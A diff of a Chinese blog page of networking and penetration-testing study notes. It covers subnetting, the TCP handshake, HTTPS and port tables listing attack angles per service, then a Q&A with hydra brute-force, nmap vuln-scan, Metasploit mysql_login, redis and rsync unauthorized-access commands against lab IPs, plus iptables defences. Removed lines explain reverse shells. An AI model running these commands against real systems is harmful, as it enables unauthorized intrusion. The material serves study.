+<h3 id="划分子网"><a href="#划分子网" class="headerlink" title="划分子网"></a><strong>划分子网</strong></h3><p>早期IP 地址的设计确实不够合理<br>– 两级的 IP 地址不够灵活<br>– IP 地址空间的利用率有时很低<br>– 路由表太大，网络性能差</p>
+<p><strong>划分子网(subnetting)</strong></p>
+<p>– 互联网的正式标准协议 </p>
+<p>– 在 IP 地址中增加 “子网号字段” subnet-id </p>
+<p>– 子网号是借用若干位的主机号 </p>
+<p>– 两级IP 地址变为三级 IP 地址<br>IP地址 ::= {&lt;网络号&gt;, &lt;子网号&gt;, &lt;主机号&gt;}</p>
+<p>通常 划分子网是一个单位内部事情 外网看不见划分情况 </p>
+<p>这个单位对外仍然表现为一个网络。 </p>
+<p>– 从其他网络发送给本单位某个主机的 IP 数据报 </p>
+<p>– 仍然根据 IP 数据报的<strong>目的网络号 net-id</strong>，先找到连接 在本单位网络上的路由器</p>
+<p>– 单位网<strong>路由器</strong>收到后，再按目的网络号 net-id 和子网 号 subnet-id 找到目的子网</p>
+<p>– 最后将 IP 数据报直接交付目的主机</p>
+<p><strong>如何判断是否划分子网？</strong></p>
+<p>• 从IP数据报的首部无法判断 </p>
+<p><strong>• 使用子网掩码(subnet mask)</strong></p>
+<hr>
+<h2 id="运输层"><a href="#运输层" class="headerlink" title="运输层"></a><strong>运输层</strong></h2><p>TCP/IP 的运输层有两个不同的协议： </p>
+<p><strong>(1)用户数据报协议 UDP   (User Datagram Protocol)</strong> </p>
+<p>– 当运输层采用无连接的 UDP 协议时，这种逻辑通信信 道是一条不可靠信道。 </p>
+<p><strong>(2) 传输控制协议 TCP     (Transmission Control Protocol)</strong> </p>
+<p>– 当运输层采用面向连接的 TCP 协议时，尽管下面的网络是不可靠的（只提供尽最大努力服务），但这种逻辑通信信道就相当于一条全双工的可靠信道。</p>
+<p>TCP 最主要的特点 </p>
+<p>• TCP 是面向连接的           <strong>• 每一条 TCP 连接只能有两个端点</strong> 只能是点对点（一对一）</p>
+<p>• TCP 提供可靠交付的服务 <strong>无差错，不丢失，不重复，按序到达</strong></p>
+<p>• TCP 提供全双工通信 • TCP 是面向字节流的</p>
+<h3 id="三次握手建立-TCP-连接"><a href="#三次握手建立-TCP-连接" class="headerlink" title="三次握手建立 TCP 连接"></a><strong>三次握手建立 TCP 连接</strong></h3><p><strong>A 的 TCP 向 B</strong> 发出连接请求报文段，其首部中的同步位 SYN = 1，并选择序号 seq = x，</p>
+<p>表明传送数据时的第一个数据字节的序号是 x。</p>
+<p><strong>B 的 TCP 收到连接</strong>请求报文段后，如同意，则 发回确认。</p>
+<p>B 在确认报文段中应使 SYN = 1，使 ACK = 1， 其确认号ack = x + 1，自己选择的序号 seq = y。</p>
+<p><strong>A 收到此报文段后</strong>向 B 给出确认，其ACK = 1， 确认号 ack = y + 1,  A 的 TCP 通知上层应用进程，连接已经建立</p>
+<p><strong>B 的 TCP 收到主机A 的确认后</strong>，也通知其上层 应用进程：TCP 连接已经建立。</p>
+<p>第一次握手：客户端尝试连接服务器，向服务器发送syn包（同步序列编号），syn=j，其进入SYN_SEND 状态等待服务器确认：我已准备好，随时出发！</p>
+<p>第二次握手：服务器接收客户端 syn 包并确认（ack=j+1），同时向客户端发送一个 syn 包（syn=k），也即 syn + ack 包，此时服务器进入SYN_RECV 状态：收到请求，随时接收。</p>
+<p>第三次握手：客户端收到服务器的 syn + ack 包，向服务器发送确认包 ack(ack=k+1），此包发送完毕，客户端和服务器进入ESTABLISHED 状态，完成三次握手：OK，我知道了，那我们开始发送数据。</p>
+<img src="/2020/04/17/%E8%AE%A1%E7%BD%91%E5%9F%BA%E7%A1%80/2.png" style="zoom:80%;">
+
+<hr>
+<p>三类端口 </p>
+<p>• 熟知端口，数值一般为 0~1023。 </p>
+<p>• 登记端口号，数值为1024~49151，为没有熟知 端口号的应用程序使用的。使用这个范围的端口 号必须在 IANA 登记，以防止重复。 </p>
+<p>• 客户端口号或短暂端口号，数值为49152~65535， 留给客户进程选择暂时使用。当服务器进程收到 客户进程的报文时，就知道了客户进程所使用的 动态端口号。通信结束后，这个端口号可供其他 客户进程以后使</p>
+<h2 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a><strong>应用层</strong></h2><p>超文本传送协议 HTTP<br>• 用户点击鼠标后所发生的事件</p>
+<p> (1) 浏览器分析超链指向页面的 URL。</p>
+<p> (2) 浏览器向 DNS 请求解析 <a href="http://www.tsinghua.edu.cn" target="_blank" rel="noopener">www.tsinghua.edu.cn</a> 的 IP 地址。</p>
+<p> (3) 域名系统 DNS 解析出清华大学服务器的 IP 地址。</p>
+<p> (4) 浏览器与服务器建立 TCP 连接 </p>
+<p>(5) 浏览器发出取文件命令： GET /chn/yxsz/index.htm。</p>
+<p> (6) 服务器给出响应，把文件 index.htm 发给浏览器。</p>
+<p> (7) TCP 连接释放。 </p>
+<p>(8) 浏览器显示“清华大学院系设置”文件 index.htm 中的所 有文本。</p>
+<h3 id="HTTPS加密协议过程："><a href="#HTTPS加密协议过程：" class="headerlink" title="HTTPS加密协议过程："></a><strong>HTTPS加密协议过程：</strong></h3><p>① 客户端将它所支持的算法列表和一个用作产生密钥的随机数发送给服务器；</p>
+<p>② 服务器从算法列表中选择一种加密算法，并将它和一份包含<a href="https://baike.baidu.com/item/服务器/100571" target="_blank" rel="noopener">服务器</a>公用密钥的证书发送给<a href="https://baike.baidu.com/item/客户端/101081" target="_blank" rel="noopener">客户端</a>；该证书还包含了用于认证目的的服务器标识，服务器同时还提供了一个用作产生密钥的随机数；</p>
+<p>③ 客户端对服务器的证书进行验证（有关验证证书，可以参考<a href="https://baike.baidu.com/item/数字签名/212550" target="_blank" rel="noopener">数字签名</a>），并抽取服m务器的公用密钥；然后，再产生一个称作 pre_master_secret 的随机密码串，并使用服务器的公用密钥对其进行加密（参考非对称加 / 解密），并将加密后的信息发送给服务器；</p>
+<p>④ 客户端与服务器端根据 pre_master_secret 以及客户端与服务器的随机数值独立计算出加密和 <a href="https://baike.baidu.com/item/MAC/173" target="_blank" rel="noopener">MAC</a>密钥（参考 DH密钥交换算法） ；</p>
+<p>⑤ 客户端将所有握手消息的 MAC 值发送给服务器；</p>
+<p>⑥ 服务器将所有握手消息的 MAC 值发送给客户端。</p>
+<hr>
+<h2 id="常用端口"><a href="#常用端口" class="headerlink" title="常用端口"></a><strong>常用端口</strong></h2><h3 id="文件共享服务端口"><a href="#文件共享服务端口" class="headerlink" title="文件共享服务端口"></a><strong>文件共享服务端口</strong></h3><table>
+<thead>
+<tr>
+<th><strong>端口号</strong></th>
+<th><strong>端口说明</strong></th>
+<th><strong>利用方向</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>21/69</strong></td>
+<td><strong>FTP/TFTP 文件传输协议</strong></td>
+<td><strong>允许匿名上传、下载、爆破和嗅探</strong></td>
+</tr>
+<tr>
+<td><strong>2049</strong></td>
+<td><strong>NFS 服务</strong></td>
+<td><strong>配置不当</strong></td>
+</tr>
+<tr>
+<td><strong>139</strong></td>
+<td><strong>Samba 服务</strong></td>
+<td><strong>爆破、未授权访问、远程代码执行</strong></td>
+</tr>
+<tr>
+<td><strong>389</strong></td>
+<td><strong>LDAP 目录访问协议</strong></td>
+<td><strong>注入、允许匿名访问、弱口令</strong></td>
+</tr>
+</tbody></table>
+<h3 id="远程连接服务器端口"><a href="#远程连接服务器端口" class="headerlink" title="远程连接服务器端口"></a><strong>远程连接服务器端口</strong></h3><table>
+<thead>
+<tr>
+<th><strong>端口号</strong></th>
+<th><strong>端口说明</strong></th>
+<th><strong>利用方向</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>22</strong></td>
+<td><strong>SSH远程连接</strong></td>
+<td><strong>爆破、SSH隧道及内网代理转发、文件传输</strong></td>
+</tr>
+<tr>
+<td><strong>23</strong></td>
+<td><strong>Telnet远程登录服务</strong></td>
+<td><strong>爆破、嗅探、弱口令</strong></td>
+</tr>
+<tr>
+<td><strong>3389</strong></td>
+<td><strong>RDP远程桌面连接</strong></td>
+<td><strong>Shift后门(Windows Server 2003以下版本)、爆破</strong></td>
+</tr>
+<tr>
+<td><strong>5900</strong></td>
+<td><strong>VNC</strong></td>
+<td><strong>弱口令爆破</strong></td>
+</tr>
+<tr>
+<td><strong>5632</strong></td>
+<td><strong>PyAnywhere服务</strong></td>
+<td><strong>抓密码、代码执行</strong></td>
+</tr>
+</tbody></table>
+<p><strong>22端口：</strong>传统的网络服务程序，如：ftp、pop和telnet在本质上都是不安全的，因为它们在网络上用明文传送口令和数据，别有用心的人非常容易就可以截获这些口令和数据。而且，这些服务程序的安全验证方式也是有其弱点的，就是很容易受到“中间人”（man-in-the-middle）这种方式的攻击。所谓“中间人”的攻击方式，就是“中间人”冒充真正的服务器接收你的传给服务器的数据，然后再冒充你把数据传给真正的服务器。服务器和你之间的数据传送被“中间人”一转手做了手脚之后，就会出现很严重的问题。</p>
+<p>SSH的英文全称是Secure  SHell。通过使用SSH，你可以把所有传输的数据进行加密，这样“中间人”这种攻击方式就不可能实现了，而且也能够<strong>防止DNS和IP欺骗</strong>。还有一个额外的好处就是<strong>传输的数据是经过压缩</strong>的，所以可以加快传输的速度。SSH有很多功能，它既可以代替telnet，又可以为ftp、pop、甚至ppp提供一个安全的“通道”。 </p>
+<h3 id="Web应用服务端口"><a href="#Web应用服务端口" class="headerlink" title="Web应用服务端口"></a><strong>Web应用服务端口</strong></h3><table>
+<thead>
+<tr>
+<th><strong>端口号</strong></th>
+<th><strong>端口说明</strong></th>
+<th><strong>利用方向</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>80/443/8080</strong></td>
+<td><strong>常见Web服务端口</strong></td>
+<td><strong>Web攻击、爆破、对应服务版本漏洞</strong></td>
+</tr>
+<tr>
+<td><strong>7001/70022</strong></td>
+<td><strong>Weblogic控制台</strong></td>
+<td><strong>Java 反序列化、弱口令</strong></td>
+</tr>
+<tr>
+<td><strong>8080/8089</strong></td>
+<td><strong>Jboos/Resin/Jetty/Jenkins</strong></td>
+<td><strong>反序列化、控制台弱口令</strong></td>
+</tr>
+<tr>
+<td><strong>9090</strong></td>
+<td><strong>WebSphere控制台</strong></td>
+<td><strong>Java 反序列化、弱口令</strong></td>
+</tr>
+<tr>
+<td><strong>4848</strong></td>
+<td><strong>GlassFish控制台</strong></td>
+<td><strong>弱口令</strong></td>
+</tr>
+<tr>
+<td><strong>1352</strong></td>
+<td><strong>Lotus dominion邮件服务</strong></td>
+<td><strong>弱口令、信息泄露、爆破</strong></td>
+</tr>
+<tr>
+<td><strong>10000</strong></td>
+<td><strong>Webmin-Web控制面板</strong></td>
+<td><strong>弱口令</strong></td>
+</tr>
+</tbody></table>
+<h3 id="数据库端口"><a href="#数据库端口" class="headerlink" title="数据库端口"></a><strong>数据库端口</strong></h3><table>
+<thead>
+<tr>
+<th>端口号</th>
+<th>端口说明</th>
+<th>利用方向</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>3306</strong></td>
+<td><strong>MySQL</strong></td>
+<td><strong>注入、提权、爆破</strong></td>
+</tr>
+<tr>
+<td><strong>1433</strong></td>
+<td><strong>MSSQL</strong></td>
+<td><strong>注入、提权、SAP弱口令、爆破</strong></td>
+</tr>
+<tr>
+<td><strong>1521</strong></td>
+<td><strong>Oracle</strong></td>
+<td><strong>TNS爆破、注入、反弹Shell</strong></td>
+</tr>
+<tr>
+<td><strong>5432</strong></td>
+<td><strong>PostgreSQL</strong></td>
+<td><strong>爆破、注入、弱口令</strong></td>
+</tr>
+<tr>
+<td><strong>27017/27018</strong></td>
+<td><strong>MongoDB</strong></td>
+<td><strong>爆破、未授权访问</strong></td>
+</tr>
+<tr>
+<td><strong>6379</strong></td>
+<td><strong>Redis</strong></td>
+<td><strong>未授权访问、弱口令爆破</strong></td>
+</tr>
+<tr>
+<td><strong>5000</strong></td>
+<td><strong>SysBase/DB2</strong></td>
+<td><strong>爆破、注入</strong></td>
+</tr>
+</tbody></table>
+<h3 id="邮件服务端口"><a href="#邮件服务端口" class="headerlink" title="邮件服务端口"></a><strong>邮件服务端口</strong></h3><table>
+<thead>
+<tr>
+<th>端口号</th>
+<th>端口说明</th>
+<th>利用方向</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>25</strong></td>
+<td><strong>SMTP 邮件服务</strong></td>
+<td><strong>邮件伪造</strong></td>
+</tr>
+<tr>
+<td><strong>109/110</strong></td>
+<td><strong>POP2/POP3</strong></td>
+<td><strong>爆破、嗅探</strong></td>
+</tr>
+<tr>
+<td><strong>143</strong></td>
+<td><strong>IMAP</strong></td>
+<td><strong>爆破</strong></td>
+</tr>
+</tbody></table>
+<p>端口说明：<strong>109端口是为POP2（Post Office Protocol Version  2，邮局协议2）服务开放的，110端口是为POP3（邮件协议3）服务开放的，POP2、POP3都是主要用于接收邮件的，目前POP3使用的比较多</strong>，许多服务器都同时支持POP2和POP3。客户端可以使用POP3协议来访问服务端的邮件服务，如今ISP的绝大多数邮件服务器都是使用该协议。在使用电子邮件客户端程序的时候，会要求输入POP3服务器地址，默认情况下使用的就是110端口。</p>
+<p>端口漏洞：POP2、POP3在提供邮件接收服务的同时，也出现了不少的漏洞。单单POP3服务在用户名和密码交换缓冲区溢出的漏洞就不少于20个，比如WebEasyMail POP3 Server合法用户名信息泄露漏洞，通过该漏洞远程攻击者可以验证用户账户的存在。另外，110端口也被ProMail  trojan等木马程序所利用，通过110端口可以窃取POP账号用户名和密码。</p>
+<p>操作建议：如果是执行邮件服务器，可以打开该端口</p>
+<h3 id="网络协议端口"><a href="#网络协议端口" class="headerlink" title="网络协议端口"></a><strong>网络协议端口</strong></h3><table>
+<thead>
+<tr>
+<th>端口号</th>
+<th>端口说明</th>
+<th>利用方向</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>53</strong></td>
+<td><strong>DNS域名系统</strong></td>
+<td><strong>允许区域传送、DNS劫持、缓存投毒、欺骗</strong></td>
+</tr>
+<tr>
+<td><strong>67/68</strong></td>
+<td><strong>DHCP服务</strong></td>
+<td><strong>劫持、欺骗</strong></td>
+</tr>
+<tr>
+<td><strong>161</strong></td>
+<td><strong>SNMP协议</strong></td>
+<td><strong>爆破、搜集目标内网信息</strong></td>
+</tr>
+</tbody></table>
+<h3 id="特殊服务端口"><a href="#特殊服务端口" class="headerlink" title="特殊服务端口"></a><strong>特殊服务端口</strong></h3><table>
+<thead>
+<tr>
+<th>端口号</th>
+<th>端口说明</th>
+<th>利用方向</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>2128</strong></td>
+<td><strong>Zookeeper 服务</strong></td>
+<td><strong>未授权访问</strong></td>
+</tr>
+<tr>
+<td><strong>8068</strong></td>
+<td><strong>Zabbix 服务</strong></td>
+<td><strong>远程执行、SQL注入</strong></td>
+</tr>
+<tr>
+<td><strong>9200/9300</strong></td>
+<td><strong>Elasticsearch 服务</strong></td>
+<td><strong>远程执行</strong></td>
+</tr>
+<tr>
+<td><strong>11211</strong></td>
+<td><strong>Memcache 服务</strong></td>
+<td><strong>未授权访问</strong></td>
+</tr>
+<tr>
+<td><strong>512/513/514</strong></td>
+<td><strong>Linux Rexec 服务</strong></td>
+<td><strong>爆破、Rlogin登陆</strong></td>
+</tr>
+<tr>
+<td><strong>873</strong></td>
+<td><strong>Rsync 服务</strong></td>
+<td><strong>匿名访问、文件上传</strong></td>
+</tr>
+<tr>
+<td><strong>3690</strong></td>
+<td><strong>Svn 服务</strong></td>
+<td><strong>Svn泄露、未授权访问</strong></td>
+</tr>
+<tr>
+<td><strong>50000</strong></td>
+<td><strong>SAP Management Console</strong></td>
+<td><strong>远程执行</strong></td>
+</tr>
+</tbody></table>
+<h3 id="端口概念"><a href="#端口概念" class="headerlink" title="端口概念"></a><strong>端口概念</strong></h3><p>在网络技术中，端口（Port）大致有两种意思：一是物理意义上的端口，比如，ADSL  Modem、集线器、交换机、路由器用于连接其他网络设备的接口，如RJ-45端口、SC端口等等。二是逻辑意义上的端口，一般是指TCP/IP协议中的端口，端口号的范围从0到65535，比如用于浏览网页服务的80端口，用于FTP服务的21端口等等。我们这里将要介绍的就是逻辑意义上的端口。</p>
+<h3 id="端口分类"><a href="#端口分类" class="headerlink" title="端口分类"></a><strong>端口分类</strong></h3><p>逻辑意义上的端口有多种分类标准，下面将介绍两种常见的分类：</p>
+<p><strong>1、按端口号分布划分</strong></p>
+<p>（1）知名端口（Well-Known Ports）</p>
+<p><strong>知名端口即众所周知的端口号，范围从0到1023</strong>，这些端口号一般固定分配给一些服务。比如21端口分配给FTP服务，25端口分配给SMTP（简单邮件传输协议）服务，80端口分配给HTTP服务，135端口分配给RPC（远程过程调用）服务等等。</p>
+<p>（2）动态端口（Dynamic Ports）</p>
+<p>　　<strong>动态端口的范围从1024到65535</strong>，这些端口号一般不固定分配给某个服务，也就是说许多服务都可以使用这些端口。只要运行的程序向系统提出访问网络的申请，那么系统就可以从这些端口号中分配一个供该程序使用。比如1024端口就是分配给第一个向系统发出申请的程序。在关闭程序进程后，就会释放所占用的端口号。</p>
+<p>　不过，动态端口也常常被病毒木马程序所利用，如冰河默认连接端口是7626、WAY 2.4是8011、Netspy 3.0是7306、YAI病毒是1024等等。</p>
+<p><strong>2、按协议类型划分</strong></p>
+<p>按协议类型划分，可以分为TCP、UDP、IP和ICMP（Internet控制消息协议）等端口。下面主要介绍TCP和UDP端口：</p>
+<p>（1）TCP端口</p>
+<p>TCP端口，即传输控制协议端口，需要在客户端和服务器之间建立连接，这样可以提供可靠的数据传输。常见的包括FTP服务的21端口，Telnet服务的23端口，SMTP服务的25端口，以及HTTP服务的80端口等等。</p>
+<p>（2）UDP端口</p>
+<p>UDP端口，即用户数据包协议端口，无需在客户端和服务器之间建立连接，安全性得不到保障。<strong>常见的有DNS服务的53端口，SNMP（简单网络管理协议）服务的161端口</strong>，QQ使用的8000和4000端口等等。</p>
+<h3 id="查看端口"><a href="#查看端口" class="headerlink" title="查看端口"></a><strong>查看端口</strong></h3><p>在Windows 2000/XP/Server 2003中要查看端口，可以使用Netstat命令：</p>
+<p>依次点击“开始→运行”，键入“cmd”并回车，打开命令提示符窗口。在命令提示符状态下键入“netstat -a -n”，按下回车键后就可以看到以数字形式显示的TCP和UDP连接的端口号及状态（如图）。</p>
+<p>小知识：Netstat命令用法</p>
+<p>命令格式：Netstat －a －e －n －o －s</p>
+<p><strong>一般用 netstat -ano 来查看使用中的端口</strong></p>
+<p>　　－a 表示显示所有活动的TCP连接以及计算机监听的TCP和UDP端口。</p>
+<p>　　－e 表示显示以太网发送和接收的字节数、数据包数等。</p>
+<p>　　－n 表示只以数字形式显示所有活动的TCP连接的地址和端口号。</p>
+<p>　　－o 表示显示活动的TCP连接并包括每个连接的进程ID（PID）。</p>
+<p>　　－s 表示按协议显示各种连接的统计信息，包括端口号</p>
+<hr>
+<p>参考：<a href="https://www.cnblogs.com/zane-s/p/12435873.html" target="_blank" rel="noopener">https://www.cnblogs.com/zane-s/p/12435873.html</a></p>
+
+      
+      <!-- reward -->
+      
+    </div>
+    
+    
+      <!-- copyright -->
+      
+    <footer class="article-footer">
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%9F%BA%E7%A1%80/" rel="tag">基础</a></li></ul>
+
+
+    </footer>
+
+  </div>
+
+  
+
+  
+  
+  
+
+  
+
+</article>
+    
     <article id="post-web杂烩" class="article article-type-post" itemscope
   itemprop="blogPost" data-scroll-reveal>
 
@@ -115,26 +784,41 @@
       
 
       
-      <p>以下工具或命令不能实现端口转发是（）</p>
-<p>端口转发（Port forwarding）是安全壳(SSH)  为网络安全通信使用的一种方法。SSH可以利用端口转发技术来传输其他TCP/IP协议的报文，当使用这种方式时，SSH就为其他服务在客户端和服务器端建立了一条安全的传输管道。端口转发利用本客户机端口映射到服务器端口来工作，SSH可以映射所有的服务器端口到本地端口，但要设置1024以下的端口需要根用户权限。在使用防火墙的网络中，如果设置为允许SSH服务通过(开启了22端口)，而阻断了其他服务，则被阻断的服务仍然可以通过端口转发技术转发数据包</p>
-<p>ssh可以实现本地端口转发,远程端口转发,动态端口转发。  <a href="https://www.cnblogs.com/keerya/articles/7612715.html" target="_blank" rel="noopener">https://www.cnblogs.com/keerya/articles/7612715.html</a>     netsh端口转发:  <a href="https://www.jianshu.com/p/3b108844729e" target="_blank" rel="noopener">https://www.jianshu.com/p/3b108844729e</a>  </p>
-<p>htran端口转发:  <a href="https://cloud.tencent.com/developer/article/1365274" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1365274</a>   </p>
-<p>MSBuild: MSBuild 是 Microsoft 和 Visual Studio的生成系统。可以用来绕过AppLocker  <a href="https://mp.weixin.qq.com/s?__biz=MzI0MDY1MDU4MQ==&amp;amp;amp;amp;idx=3&amp;amp;amp;amp;mid=2247485170&amp;amp;amp;amp;sn=aaeff82030075ceefa342a86664395a5" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI0MDY1MDU4MQ==&amp;amp;amp;amp;idx=3&amp;amp;amp;amp;mid=2247485170&amp;amp;amp;amp;sn=aaeff82030075ceefa342a86664395a5</a>   </p>
-<p>更多端口转发工具  <a href="http://blog.sina.cn/dpool/blog/s/blog_777f9dbb0101008r.html?vt=4" target="_blank" rel="noopener">http://blog.sina.cn/dpool/blog/s/blog_777f9dbb0101008r.html?vt=4</a>   <a href="https://www.freebuf.com/articles/web/170970.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/170970.html</a></p>
+      <h3 id="如下端口默认对应的服务，在渗透测试过程中我们可以从哪些角度考虑其安全问题？"><a href="#如下端口默认对应的服务，在渗透测试过程中我们可以从哪些角度考虑其安全问题？" class="headerlink" title="如下端口默认对应的服务，在渗透测试过程中我们可以从哪些角度考虑其安全问题？"></a>如下端口默认对应的服务，在渗透测试过程中我们可以从哪些角度考虑其安全问题？</h3><p><strong>端口：21、22、873、1433、3306、6379、11211</strong> </p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#21端口，弱口令爆破</span></span><br><span class="line">hydra <span class="literal">-l</span> root <span class="literal">-P</span> password.txt <span class="literal">-t</span> <span class="number">5</span> <span class="literal">-vV</span>  <span class="number">192.168</span>.xx ftp</span><br><span class="line"><span class="comment">#发现ftp的版本是proftpd 1.3.3c，该版本存在后门，利用msf中的模块可以进行利用</span></span><br><span class="line">nmap -<span class="literal">-script</span>=vuln <span class="number">192.168</span>.<span class="number">137</span>.* <span class="comment">#发现常见漏洞</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#22端口，弱口令爆破</span></span><br><span class="line">hydra <span class="literal">-l</span> root <span class="literal">-P</span> password.txt <span class="literal">-t</span> <span class="number">5</span> <span class="literal">-vV</span>  <span class="number">192.168</span>.xx ssh</span><br></pre></td></tr></table></figure>
+
+<p><strong>rsync默认的端口是873</strong>，该服务<strong>存在未授权访问漏洞</strong></p>
+<p>找到开放端口后，查看时候可默认口令登陆。使用命令查看：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rsync root@192.168.31.69:: 连接rsync</span><br><span class="line">rsync root@192.168.31.69::www 连接rsync并查看www文件夹内的文件</span><br></pre></td></tr></table></figure>
+
+<p>注意两种方式防御，<strong>一是限定访问的IP，另一个是不允许匿名访问，添加用户口令。</strong></p>
+<p>限定IP的两种方式</p>
+<p><strong>IPTables防火墙</strong></p>
+<p><strong>给rsync的端口添加一个iptables</strong>。</p>
+<p>只希望能够从内部网络（192.168.101.0/24）访问：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -i eth0 -p tcp -s 192.168.101.0&#x2F;24 --dport 873 -m state --state NEW,ESTABLISHED -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -o eth0 -p tcp --sport 873 -m state --state ESTABLISHED -j ACCEPT</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1433(mssql)、3306(mysql)都是数据库端口，也存在弱口令漏洞，可以用msf试着爆破</span></span><br><span class="line">use auxiliary/scanner/mysql/mysql_login <span class="comment">#使用mysql爆破模块</span></span><br><span class="line">set rhosts <span class="number">192.168</span>.<span class="number">31.69</span> <span class="comment">#设置目标ip</span></span><br><span class="line">set username root <span class="comment">#设置用户名</span></span><br><span class="line">set pass_file /root/passwd.txt <span class="comment">#设置密码字典</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#一般无验证，直接访问</span></span><br><span class="line"><span class="comment">#6379使用的是redis服务，可能存在未授权访问漏洞，利用该漏洞需要安装redis,安装命令如下：</span></span><br><span class="line">wget http://download.redis.io/releases/redis<span class="literal">-2</span>.<span class="number">8.12</span>.tar.gz 下载redis</span><br><span class="line">tar <span class="literal">-xzf</span> redis<span class="literal">-2</span>.<span class="number">8.12</span>.tar.gz 解压</span><br><span class="line">cd redis<span class="literal">-2</span>.<span class="number">8.12</span>/ 切换到解压后的目录下</span><br><span class="line">make 编译</span><br><span class="line">cd /root/redis<span class="literal">-2</span>.<span class="number">8.12</span>/src 切换到这个目录</span><br><span class="line">./redis<span class="literal">-cli</span> <span class="literal">-h</span> <span class="number">192.168</span>.<span class="number">31.69</span> 执行redis<span class="literal">-cli</span>连接</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#只允许本机使用11211</span></span><br><span class="line">iptables <span class="literal">-A</span> INPUT <span class="literal">-p</span> tcp <span class="literal">-s</span> <span class="number">127.0</span>.<span class="number">0.1</span> -<span class="literal">-dport</span> <span class="number">11211</span> <span class="literal">-j</span> ACCEPT</span><br><span class="line">iptables <span class="literal">-A</span> INPUT <span class="literal">-p</span> udp <span class="literal">-s</span> <span class="number">127.0</span>.<span class="number">0.1</span> -<span class="literal">-dport</span> <span class="number">11211</span> <span class="literal">-j</span> ACCEPT</span><br><span class="line"></span><br><span class="line"><span class="comment">#禁止公网入方向11211端口</span></span><br><span class="line">iptables <span class="literal">-I</span> INPUT <span class="literal">-p</span> tcp -<span class="literal">-dport</span> <span class="number">11211</span> <span class="literal">-j</span> DROP</span><br><span class="line">iptables <span class="literal">-I</span> INPUT <span class="literal">-p</span> udp -<span class="literal">-dport</span> <span class="number">11211</span> <span class="literal">-j</span> DROP</span><br><span class="line"></span><br><span class="line"><span class="comment">#保存配置，重启iptables</span></span><br><span class="line">service iptables save</span><br><span class="line">service iptables restart</span><br></pre></td></tr></table></figure>
+
 <hr>
-<p>php://phar是用来读取phar文件的 phar文件在使用特定的函数时会触发反序列化漏洞具体利用方法 <a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></p>
-<h2 id="反弹shell原理与实现"><a href="#反弹shell原理与实现" class="headerlink" title="反弹shell原理与实现"></a><a href="https://www.cnblogs.com/iouwenbo/p/11277453.html" target="_blank" rel="noopener">反弹shell原理与实现</a></h2><p><strong>什么是反弹shell？</strong></p>
-<p>　　反弹shell（reverse  shell），就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse  shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。</p>
-<p><strong>为什么要反弹shell？</strong></p>
-<p>通常用于被控端因防火墙受限、权限不足、端口被占用等情形。</p>
-<p>举例：假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web服务、ssh、telnet等等都是正向连接。那么什么情况下正向连接不能用了呢？</p>
-<p>有如下情况：</p>
-<p>1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。 </p>
-<p>2.目标机器的ip动态改变，你不能持续控制。</p>
-<p>3.由于防火墙等限制，对方机器只能发送请求，不能接收请求。</p>
-<p>4.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机等情况都是未知的，所以建立一个服务端让恶意程序主动连接，才是上策。</p>
-<p>那么反弹就很好理解了，攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。</p>
-<p>==============================================================</p>
